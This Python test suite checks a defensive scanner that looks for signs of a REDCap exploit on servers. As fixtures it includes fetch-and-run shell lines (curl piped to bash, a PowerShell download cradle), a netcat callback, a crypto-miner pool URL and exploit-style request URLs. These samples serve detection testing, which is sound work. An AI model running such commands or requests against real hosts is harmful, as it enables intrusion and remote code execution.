#!/usr/bin/env python3
# Copyright 2026 University of Florida
# SPDX-License-Identifier: Apache-2.0
"""
Fixture-driven unit tests for redcap_cve_2026_90817_scan.

Stdlib `unittest` only (the scanner is stdlib-only and must stay installable by
copying one file). Run:

    python3 -m unittest discover -s tests -v
    # or
    python3 tests/test_scan.py

The host-state checks are exercised through a FakeProvider that injects
processes/sockets/scheduled-jobs/keys/profiles, so BOTH platforms can be tested
on either OS with no live host:
  * UF regression-tests the Linux path (and the shared log/version/verdict
    logic) after any Windows-driven change, with no Windows box.
  * The AU team unit-tests Windows provider behavior against recorded fixtures
    with no live compromised host.
"""

import argparse
import os
import sys
import tempfile
import unittest

# Import the single-file scanner from the repo root.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import redcap_cve_2026_90817_scan as scan  # noqa: E402

FIXTURES = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")
LOGDIR = os.path.join(FIXTURES, "logs")


def make_args(**kw):
    """A minimal args namespace for run_scan / check_access_logs."""
    defaults = dict(redcap_root="/nonexistent", log_dir=None, home_dir=None,
                    platform="linux", full_hash_scan=False, mitigation_date=None,
                    max_log_matches="all", json=False, quiet=False)
    defaults.update(kw)
    return argparse.Namespace(**defaults)


class FakeProvider(scan.HostProvider):
    """A HostProvider whose facts are injected, for testing the shared checks.

    Represents whatever scenario a test sets up, independent of the real OS.
    """
    name = "fake"
    host_state_confidence = "documented"

    def __init__(self, *, privileged=True, staging=(), processes=(), sockets=(),
                 jobs=(), keys=(), rc=(), history=(), masquerade=(),
                 log_dirs=(), can_proc=True, can_sock=True,
                 fetch_res=None):
        self._priv = privileged
        self._staging = list(staging)
        self._procs = list(processes)
        self._socks = list(sockets)
        self._jobs = list(jobs)
        self._keys = list(keys)
        self._rc = list(rc)
        self._history = list(history)
        self._masq = list(masquerade)
        self._log_dirs = list(log_dirs)
        self._can_proc = can_proc
        self._can_sock = can_sock
        self._fetch_res = fetch_res or [scan.FETCH_TO_SHELL_RE]

    def is_privileged(self): return self._priv
    def staging_dirs(self): return list(self._staging)
    def exec_from_dirs(self): return tuple(self._staging)
    def home_dirs(self, extra): return list(extra or [])
    def default_log_dirs(self): return list(self._log_dirs)
    def log_globs(self): return ["*.log", "*access*", "*.log.gz", "*access*.gz"]
    def fetch_to_shell_res(self): return list(self._fetch_res)
    def can_enumerate_processes(self): return self._can_proc
    def can_enumerate_sockets(self): return self._can_sock
    def iter_processes(self): return list(self._procs)
    def iter_sockets(self): return list(self._socks)
    def iter_scheduled_jobs(self): return list(self._jobs)
    def iter_authorized_keys(self, homes): return list(self._keys)
    def iter_persistence_rc(self, homes): return list(self._rc)
    def history_suppression(self, homes): return list(self._history)
    def masquerade_findings(self, procs): return list(self._masq)


def findings_by_check(rep):
    out = {}
    for f in rep.findings:
        out.setdefault(f.check, []).append(f)
    return out


# --------------------------------------------------------------------------- #
# Version logic
# --------------------------------------------------------------------------- #

class VersionTests(unittest.TestCase):
    def test_patched_boundaries(self):
        self.assertTrue(scan.version_is_patched((16, 0, 49)))
        self.assertTrue(scan.version_is_patched((17, 3, 10)))
        self.assertTrue(scan.version_is_patched((17, 4, 4)))
        self.assertTrue(scan.version_is_patched((18, 0, 0)))

    def test_vulnerable_versions(self):
        self.assertFalse(scan.version_is_patched((13, 7, 2)))
        self.assertFalse(scan.version_is_patched((16, 0, 48)))
        self.assertFalse(scan.version_is_patched((17, 3, 9)))
        self.assertFalse(scan.version_is_patched((17, 4, 3)))

    def test_parse_version(self):
        self.assertEqual(scan.parse_version("redcap_v13.7.2"), (13, 7, 2))
        self.assertIsNone(scan.parse_version("no-version-here"))


# --------------------------------------------------------------------------- #
# Log classification (shared across Apache CLF and IIS W3C)
# --------------------------------------------------------------------------- #

class ClassifyTests(unittest.TestCase):
    def test_dataimport_rce_sink(self):
        line = ('1.2.3.4 - - [02/Oct/2026:01:00:00 -0400] "GET '
                '/redcap/surveys/?__passthru=index.php&route=DataImportController:x '
                'HTTP/1.1" 404 1 "-" "curl"')
        ex, rc = scan._classify_log_line(line)
        self.assertTrue(any("DataImportController" in e for e in ex))

    def test_double_encoded_generalizes_to_any_controller(self):
        line = ('1.2.3.4 - - [03/Oct/2026:02:10:10 -0400] "GET '
                '/redcap/surveys/?__passthru=%2569ndex.php&route=ParcelController:show '
                'HTTP/1.1" 200 9 "-" "py"')
        ex, rc = scan._classify_log_line(line)
        # Reason strings carry the controller name lowercased (matched on the
        # fully-decoded, lowercased URL); compare case-insensitively.
        self.assertTrue(any("parcelcontroller" in e.lower()
                            and "double-encoded" in e for e in ex))

    def test_legit_passthru_is_not_flagged(self):
        line = ('1.2.3.4 - - [02/Oct/2026:00:48:49 -0400] "GET '
                '/redcap/surveys/?__passthru=index.php&route=PdfController:index '
                'HTTP/1.1" 200 1 "-" "Mozilla"')
        ex, rc = scan._classify_log_line(line)
        self.assertEqual(ex, [])
        self.assertEqual(rc, [])

    def test_attacker_ip_is_recon_not_exploit(self):
        line = ('202.61.130.221 - - [04/Oct/2026:03:00:00 -0400] "GET /redcap/ '
                'HTTP/1.1" 200 1 "-" "Mozilla"')
        ex, rc = scan._classify_log_line(line)
        self.assertEqual(ex, [])
        self.assertTrue(rc)


# --------------------------------------------------------------------------- #
# W3C (IIS) adapter and format auto-detect
# --------------------------------------------------------------------------- #

class W3CAdapterTests(unittest.TestCase):
    def test_w3c_row_to_clf_roundtrips_fields(self):
        fields = "date time c-ip cs-method cs-uri-stem cs-uri-query sc-status".split()
        row = ("2026-10-02 01:00:00 202.61.130.221 GET /redcap/surveys/ "
               "s=NXCJMDCWXE&__passthru=index.php&route=DataImportController:index "
               "404").split()
        line = scan._w3c_to_clf(fields, row)
        self.assertIn("202.61.130.221", line)
        self.assertIn("DataImportController", line)
        ip, status, size = scan._parse_clf_fields(line)
        self.assertEqual(ip, "202.61.130.221")
        self.assertEqual(status, "404")
        dt = scan.parse_apache_time(line)
        self.assertIsNotNone(dt)
        self.assertEqual(dt.date().isoformat(), "2026-10-02")

    def test_iter_clf_lines_detects_w3c(self):
        path = os.path.join(LOGDIR, "iis_u_ex261002.log")
        lines = list(scan.iter_clf_lines(path))
        # 4 data rows (header directives dropped)
        self.assertEqual(len(lines), 4)
        self.assertTrue(all('"' in ln for ln in lines))  # combined-log shape

    def test_iter_clf_lines_passthrough_for_apache(self):
        path = os.path.join(LOGDIR, "apache_access.log")
        lines = list(scan.iter_clf_lines(path))
        self.assertEqual(len(lines), 4)


class LogEquivalenceTests(unittest.TestCase):
    """Apache CLF and IIS W3C fixtures describe the SAME attacks and must yield
    the same attack summary."""

    def _summary_for(self, filename):
        rep = scan.Report()
        host = FakeProvider()
        md = scan.datetime.date.fromisoformat("2026-10-10")
        # point check at a dir holding just this one fixture
        with tempfile.TemporaryDirectory() as d:
            src = os.path.join(LOGDIR, filename)
            dst = os.path.join(d, filename)
            with open(src) as fh, open(dst, "w") as out:
                out.write(fh.read())
            scan.check_access_logs(rep, [d], host, mitigation_date=md,
                                   max_matches=None)
        return rep.attack_summary

    def test_clf_and_w3c_agree(self):
        clf = self._summary_for("apache_access.log")
        w3c = self._summary_for("iis_u_ex261002.log")
        for key in ("total", "exploit", "recon", "before_mitigation",
                    "on_mitigation_date", "after_mitigation",
                    "distinct_exploit_ips"):
            self.assertEqual(clf[key], w3c[key], f"mismatch on {key}")
        self.assertEqual(clf["total"], 3)
        self.assertEqual(clf["exploit"], 2)
        self.assertEqual(sorted(clf["distinct_exploit_ips"]),
                         ["202.61.130.221", "203.0.113.9"])


# --------------------------------------------------------------------------- #
# Host-state checks via injected provider (OS-independent)
# --------------------------------------------------------------------------- #

class HostStateTests(unittest.TestCase):
    def test_miner_process_flagged_critical(self):
        rep = scan.Report()
        host = FakeProvider(processes=[
            scan.ProcInfo(pid="123", comm="kworker",
                          cmdline="./x --url stratum+tcp://auto.c3pool.org:80"),
            scan.ProcInfo(pid="999", comm="bash", cmdline="bash"),
        ])
        scan.check_processes(rep, host)
        procf = findings_by_check(rep).get("process", [])
        self.assertTrue(any(f.severity == scan.SEV_CRITICAL for f in procf))

    def test_exec_from_temp_flagged(self):
        rep = scan.Report()
        host = FakeProvider(staging=["/var/tmp", "/tmp"], processes=[
            scan.ProcInfo(pid="7", comm="svc", cmdline="svc", exe="/var/tmp/.a/b"),
        ])
        scan.check_processes(rep, host)
        procf = findings_by_check(rep).get("process", [])
        self.assertTrue(any("temp directory" in f.title for f in procf))

    def test_socket_miner_api_and_attacker_ip(self):
        rep = scan.Report()
        host = FakeProvider(sockets=[
            scan.SockInfo("tcp", "127.0.0.1", scan.IOC_MINER_API_PORT,
                          "0.0.0.0", 0, "LISTEN"),
            scan.SockInfo("tcp", "10.0.0.2", 55000, scan.IOC_SOURCE_IP, 443,
                          "ESTAB"),
        ])
        scan.check_sockets(rep, host)
        titles = [f.title for f in findings_by_check(rep).get("socket", [])]
        self.assertEqual(len(titles), 2)

    def test_cron_fetch_to_shell(self):
        rep = scan.Report()
        host = FakeProvider(jobs=[
            scan.JobInfo(source="/etc/cron.d/evil",
                         lines=["* * * * * root curl http://x/y | bash"]),
        ])
        scan.check_cron(rep, host)
        self.assertIn("cron", findings_by_check(rep))

    def test_cron_windows_powershell_cradle(self):
        rep = scan.Report()
        host = FakeProvider(fetch_res=[scan.WIN_FETCH_TO_SHELL_RE],
                            jobs=[scan.JobInfo(
                                source="C:/Windows/System32/Tasks/Evil",
                                lines=["powershell -enc aQBlAHgA",
                                       "IEX (New-Object Net.WebClient).DownloadString('http://x')"])])
        scan.check_cron(rep, host)
        self.assertIn("cron", findings_by_check(rep))

    def test_ssh_ioc_fingerprint(self):
        rep = scan.Report()
        key = f"ssh-ed25519 AAAA{scan.IOC_SSH_FP_PARTIAL}moredata attacker@host"
        host = FakeProvider(keys=[("/root/.ssh/authorized_keys", [key])])
        scan.check_authorized_keys(rep, host, ["/root"])
        self.assertIn("ssh", findings_by_check(rep))

    def test_clean_host_has_no_host_state_findings(self):
        rep = scan.Report()
        host = FakeProvider(
            processes=[scan.ProcInfo(pid="1", comm="systemd", cmdline="/sbin/init")],
            sockets=[scan.SockInfo("tcp", "0.0.0.0", 443, "0.0.0.0", 0, "LISTEN")],
            jobs=[scan.JobInfo(source="/etc/crontab",
                               lines=["17 * * * * root cd / && run-parts /etc/cron.hourly"])],
            keys=[("/home/u/.ssh/authorized_keys", ["ssh-rsa AAAAlegit user@host"])],
            rc=[("/home/u/.bashrc", ["export PS1='$ '"])],
        )
        for fn in (scan.check_processes, scan.check_sockets):
            fn(rep, host)
        scan.check_cron(rep, host)
        scan.check_authorized_keys(rep, host, ["/home/u"])
        scan.check_profiles(rep, host, ["/home/u"])
        host_state = {"staging", "hash", "process", "socket", "cron", "ssh", "profile"}
        self.assertFalse([f for f in rep.findings if f.check in host_state])


# --------------------------------------------------------------------------- #
# Second-pass attacker pivot (discovered IPs fed back into logs + host state)
# --------------------------------------------------------------------------- #

PIVOT_LOGDIR = os.path.join(FIXTURES, "pivot_logs")


class AttackerPivotTests(unittest.TestCase):
    def _scan(self, host=None, **kw):
        with tempfile.TemporaryDirectory() as tmp:
            root = os.path.join(tmp, "redcap")
            os.makedirs(os.path.join(root, "redcap_v17.5.6"))
            args = make_args(redcap_root=root, log_dir=[PIVOT_LOGDIR],
                             mitigation_date="2026-09-21", **kw)
            return scan.run_scan(args, host or FakeProvider())

    def _candidates(self, rep, kind):
        return [c["value"] for c in rep.candidate_iocs if c["kind"] == kind]

    def test_followup_traffic_from_discovered_ip_is_reported(self):
        rep = self._scan()
        pivot = [f for f in findings_by_check(rep)["weblog"]
                 if f.title.startswith("Other traffic")]
        self.assertEqual(len(pivot), 1)
        ev = "\n".join(pivot[0].evidence)
        self.assertIn("POST /redcap/api/", ev)
        self.assertIn('"GET /redcap/ HTTP/1.1"', ev)
        self.assertEqual(rep.attack_summary["by_ip"]["198.51.100.10"]["other"], 2)

    def test_benign_ip_never_appears(self):
        rep = self._scan()
        text = scan.render_text(rep, make_args())
        self.assertNotIn("192.0.2.50", text)
        self.assertNotIn("192.0.2.50", scan.render_json(rep, make_args()))

    def test_candidates_capture_shared_and_new_features(self):
        rep = self._scan()
        self.assertEqual(sorted(self._candidates(rep, "ip")),
                         ["198.51.100.10", "198.51.100.20", "198.51.100.30"])
        self.assertEqual(self._candidates(rep, "controller"), ["NewThingController"])
        self.assertEqual(self._candidates(rep, "survey-hash"), ["?s=SHAREDHSH1"])
        self.assertIn("python-requests/2.32.5", self._candidates(rep, "user-agent"))
        self.assertIn("POST", self._candidates(rep, "method"))
        self.assertEqual(self._candidates(rep, "2xx-size"), ["5"])
        # Single-IP hash and UA are too weak to surface.
        self.assertNotIn("?s=OTHERHASH9", self._candidates(rep, "survey-hash"))
        self.assertNotIn("Mozilla/5.0 (X11; Linux i686)",
                         self._candidates(rep, "user-agent"))

    def test_socket_to_discovered_ip_flips_verdict(self):
        host = FakeProvider(sockets=[
            scan.SockInfo("tcp", "10.0.0.2", 55000, "198.51.100.20", 443, "ESTAB")])
        rep = self._scan(host)
        socks = findings_by_check(rep).get("socket", [])
        self.assertTrue(any(f.severity == scan.SEV_HIGH for f in socks))
        self.assertIn("LIKELY COMPROMISED (host IOCs present)", scan.verdict(rep))

    def test_cron_mentioning_discovered_ip_flagged(self):
        host = FakeProvider(jobs=[scan.JobInfo(
            source="/etc/cron.d/x", lines=["* * * * * root nc 198.51.100.30 4444"])])
        rep = self._scan(host)
        self.assertIn("cron", findings_by_check(rep))

    def test_attacker_ip_flag_marks_ip_known(self):
        rep = self._scan(attacker_ip=["198.51.100.10"])
        self.assertNotIn("198.51.100.10", self._candidates(rep, "ip"))
        recon = [f for f in findings_by_check(rep)["weblog"]
                 if f.title.startswith("Traffic from known")]
        self.assertTrue(any("POST /redcap/api/" in e for e in recon[0].evidence))

    def test_bad_attacker_ip_rejected(self):
        with self.assertRaises(ValueError):
            self._scan(attacker_ip=["not-an-ip"])

    def test_sanitizer_masks_candidate_hashes(self):
        import sanitize_scan_result as san
        import random
        rep = self._scan()
        text = scan.render_text(rep, make_args())
        self.assertIn("?s=SHAREDHSH1", text)
        out, _mapping, _hosts = san.sanitize(text, [], "redcap.example.org",
                                             random.Random(0))
        self.assertNotIn("SHAREDHSH1", out)


# --------------------------------------------------------------------------- #
# End-to-end run_scan + verdict
# --------------------------------------------------------------------------- #

class EndToEndTests(unittest.TestCase):
    def _redcap_root(self, tmp, version="redcap_v13.7.2"):
        root = os.path.join(tmp, "redcap")
        os.makedirs(os.path.join(root, version))
        return root

    def test_vulnerable_and_attacked_verdict(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = self._redcap_root(tmp)
            args = make_args(redcap_root=root, log_dir=[LOGDIR],
                             mitigation_date="2026-10-10")
            host = FakeProvider(privileged=True)
            rep = scan.run_scan(args, host)
            v = scan.verdict(rep)
            self.assertIn("VULNERABLE", v)
            self.assertIn("LIKELY COMPROMISED", v)
            self.assertEqual(scan.compute_exit_code(rep), 1)

    def test_patched_clean_host_is_exit_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = self._redcap_root(tmp, "redcap_v17.4.4")
            # empty log dir -> no attacks
            emptylogs = os.path.join(tmp, "logs")
            os.makedirs(emptylogs)
            args = make_args(redcap_root=root, log_dir=[emptylogs],
                             mitigation_date="2026-10-10")
            host = FakeProvider(privileged=True)
            rep = scan.run_scan(args, host)
            self.assertEqual(scan.compute_exit_code(rep), 0, scan.verdict(rep))

    def test_unprivileged_clean_is_exit_two(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = self._redcap_root(tmp, "redcap_v17.4.4")
            emptylogs = os.path.join(tmp, "logs")
            os.makedirs(emptylogs)
            args = make_args(redcap_root=root, log_dir=[emptylogs],
                             mitigation_date="2026-10-10")
            host = FakeProvider(privileged=False)
            rep = scan.run_scan(args, host)
            self.assertEqual(scan.compute_exit_code(rep), 2)


if __name__ == "__main__":
    unittest.main(verbosity=2)
